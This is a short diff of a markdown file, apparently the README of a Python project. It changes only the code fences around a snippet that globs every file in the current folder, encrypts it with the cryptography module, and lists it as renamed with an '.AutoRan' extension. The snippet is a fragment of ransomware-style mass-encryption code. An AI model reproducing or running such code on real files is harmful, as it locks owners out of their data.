@@ -5,7 +5,7 @@
 ##### Use cryptography modul
 ##### Encrypt Source Code
 
-'''Files = glob.glob("*.*")
+```Files = glob.glob("*.*")
 
 def Encry():
   try:
@@ -18,4 +18,4 @@ def Encry():
         FL.insert(END, f"{File} -> {File}.AutoRan")
         fp.close()
   except:
-    pass'''
+    pass```
